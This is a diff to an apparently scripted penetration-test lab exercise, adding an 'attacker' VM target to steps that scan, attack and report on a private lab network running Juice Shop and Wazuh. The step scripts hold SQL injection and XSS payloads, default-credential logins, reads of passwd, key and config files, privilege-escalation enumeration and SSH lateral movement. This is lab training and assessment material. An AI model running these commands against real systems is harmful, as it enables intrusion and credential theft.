@@ -73,6 +73,7 @@ steps:
     type: output_contains
     expect: Penetration Test Scope
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/pentest_scope.txt << ''EOF''
 
     === Penetration Test Scope ===
@@ -136,6 +137,7 @@ steps:
     type: output_contains
     expect: open
     field: stdout
+  target_vm: attacker
   script: nmap -sV -sC -p- --min-rate 1000 10.20.30.0/24 -oN /tmp/pentest_nmap.txt 2>&1 | tail -30 && echo '---' && echo 'Results saved to /tmp/pentest_nmap.txt'
   risk_level: low
 - order: 3
@@ -152,6 +154,7 @@ steps:
     type: output_contains
     expect: Web Vulnerability Assessment
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Web Vulnerability Assessment ==='' && echo ''[SQLi Test]'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1--'' -o /dev/null -w ''Status: %{http_code}''
     && echo '''' && echo ''[XSS Test]'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>'' -o /dev/null -w ''Status: %{http_code}'' && echo '''' && echo ''[Auth Bypass]''
     && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' | head -1 && echo '''' && echo ''[Directory
@@ -169,6 +172,7 @@ steps:
     type: output_contains
     expect: Security Device Assessment
     field: stdout
+  target_vm: attacker
   script: echo '=== Security Device Assessment ===' && nmap -sA -p 22,80,443,8080 10.20.30.1 2>&1 | tail -10 && echo '---' && nmap -sV -p 22 10.20.30.1 2>&1 | tail -5 && echo '---' && echo 'Firewall rule
     mapping complete' && echo 'SSH version identified for CVE lookup'
   risk_level: low
@@ -184,6 +188,7 @@ steps:
     type: output_contains
     expect: SIEM Assessment
     field: stdout
+  target_vm: attacker
   script: echo '=== SIEM Assessment ===' && nmap -sV -p 443,5601,9200,55000 10.20.30.100 2>&1 | tail -15 && echo '---' && echo 'Wazuh API default credentials test:' && curl -sk -u 'wazuh-wui:wazuh-wui'
     https://10.20.30.100:55000/ 2>&1 | head -3 && echo '---' && echo 'Elasticsearch test:' && curl -s http://10.20.30.100:9200/ 2>&1 | head -5
   risk_level: low
@@ -201,6 +206,7 @@ steps:
     type: output_contains
     expect: Initial Access
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Initial Access via Web Exploitation ==='' && echo ''Attempting SQLi login bypass:'' && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"\'' OR 1=1--","password":"anything"}'' | python3 -c ''import sys,json; d=json.load(sys.stdin); print("Auth:",d.get("authentication",{}).get("token","FAILED")[:50]+"...")'' 2>/dev/null
     || echo ''SQLi attempt recorded'' && echo ''---'' && echo ''Attempting default credentials:'' && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
@@ -218,6 +224,7 @@ steps:
     type: output_contains
     expect: Post-Exploitation
     field: stdout
+  target_vm: attacker
   script: echo '=== Post-Exploitation Recon ===' && echo '[System Info]' && uname -a && echo '[Users]' && cat /etc/passwd | grep -v nologin | grep -v false && echo '[Network]' && ip addr | grep 'inet '
     && echo '[Running Services]' && ss -tlnp | head -15 && echo '[Interesting Files]' && find /home /var/www /opt -name '*.conf' -o -name '*.env' -o -name '*.key' 2>/dev/null | head -10
   risk_level: low
@@ -234,6 +241,7 @@ steps:
     type: output_contains
     expect: Privilege Escalation
     field: stdout
+  target_vm: attacker
   script: echo '=== Privilege Escalation Enumeration ===' && echo '[SUID]' && find / -perm -4000 -type f 2>/dev/null | head -10 && echo '[Sudo]' && sudo -l 2>&1 | tail -5 && echo '[Cron]' && cat /etc/crontab
     2>/dev/null | grep -v '^#' | head -5 && echo '[Kernel]' && uname -r && echo '[Capabilities]' && getcap -r /usr/ 2>/dev/null | head -5 && echo '[Docker group]' && groups | grep -o docker 2>/dev/null
     || echo 'not in docker group'
@@ -251,6 +259,7 @@ steps:
     type: output_contains
     expect: Lateral Movement
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Lateral Movement Attempts ==='' && for target in 10.20.30.1 10.20.30.100; do echo "Target: $target"; ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o BatchMode=yes $target ''hostname''
     2>&1 | head -3; echo ''---''; done && echo ''Checking for reusable SSH keys:'' && find /home -name ''id_rsa'' -o -name ''id_ed25519'' 2>/dev/null && echo ''Checking for credentials in configs:'' &&
     grep -r ''password'' /etc/*.conf 2>/dev/null | head -5'
@@ -268,6 +277,7 @@ steps:
     type: output_contains
     expect: Data Exfiltration Assessment
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Data Exfiltration Assessment ==='' && echo ''[Sensitive Data Found]'' && find / -name ''*.key'' -o -name ''*.pem'' -o -name ''*.p12'' -o -name ''shadow'' 2>/dev/null | head -5 && echo
     ''[Outbound Channels]'' && echo ''DNS:'' && nslookup google.com 2>&1 | head -3 && echo ''HTTP:'' && curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000 && echo '''' && echo ''ICMP:'' &&
     ping -c 1 -W 1 10.20.30.80 2>&1 | head -2 && echo '''' && echo ''Assessment: Multiple exfil channels available'''
@@ -287,6 +297,7 @@ steps:
     type: output_contains
     expect: CVSS
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== CVSS v3.1 Vulnerability Assessment ===\n\n#1 SQL Injection - Admin Bypass\nCVSS: 9.8 (Critical)\nVector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nImpact: Full admin access, data manipulation\n\n#2
     Default Credentials (Wazuh)\nCVSS: 9.1 (Critical)\nVector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\nImpact: SIEM control, log manipulation\n\n#3 Missing Security Headers\nCVSS: 5.3 (Medium)\nVector: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\nImpact:
     Information disclosure\n\n#4 SSH Password Authentication\nCVSS: 6.5 (Medium)\nVector: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N\nImpact: Brute-force attack surface\n\n#5 Credential Reuse Across Systems\nCVSS:
@@ -306,6 +317,7 @@ steps:
     type: output_contains
     expect: Attack Chain Diagram
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Attack Chain Diagram ===\n\n[Phase 1: Reconnaissance]\nnmap scan -> 4 hosts discovered\nWeb enumeration -> JuiceShop identified\n\n[Phase 2: Initial Access]\nSQLi on JuiceShop ->
     Admin account\n         |\n         v\n[Phase 3: Post-Exploitation]\nSystem info collection -> Credentials in config\n         |\n         v\n[Phase 4: Lateral Movement]\nSSH with reused creds -> Firewall
     access\nSSH pivot -> SIEM access\n         |\n         v\n[Phase 5: Privilege Escalation]\nSUID binary -> root on web server\n         |\n         v\n[Phase 6: Objective Achievement]\nAccess to SIEM
@@ -325,6 +337,7 @@ steps:
     type: output_contains
     expect: Remediation Recommendations
     field: stdout
+  target_vm: attacker
   script: echo -e '=== Remediation Recommendations ===\n\n[P0 - Immediate (24-48h)]\n1. Fix SQL Injection in JuiceShop authentication\n2. Change default Wazuh credentials\n3. Enforce unique passwords per
     system\n\n[P1 - Short-term (1-2 weeks)]\n4. Implement HTTP security headers\n5. Disable SSH password auth, use key-based\n6. Enable IMDSv2 equivalent protections\n7. Review and harden firewall rules\n\n[P2
     - Medium-term (1-3 months)]\n8. Deploy WAF for web applications\n9. Implement network segmentation\n10. Deploy EDR on all endpoints\n11. Centralize credential management\n\n[P3 - Long-term (3-6 months)]\n12.
@@ -343,6 +356,7 @@ steps:
     type: output_contains
     expect: artifacts removed
     field: stdout
+  target_vm: attacker
   script: echo '=== Pentest Cleanup ===' && rm -f /tmp/pentest_*.txt /tmp/phish_template.html /tmp/network_map.txt /tmp/exfil_* 2>/dev/null && crontab -l 2>/dev/null | grep -v beacon | crontab - 2>/dev/null
     && pkill -f 'nc -lvnp' 2>/dev/null && echo 'Temporary files removed' && echo 'Cron entries cleaned' && echo 'Listeners terminated' && echo '' && echo 'Cleanup verification:' && ls /tmp/pentest_* 2>/dev/null
     || echo 'All pentest artifacts removed'
@@ -416,6 +430,7 @@ steps:
     type: output_contains
     expect: Executive Summary
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/pentest_executive_summary.txt << ''EOF''
 
     === Penetration Test Executive Summary ===
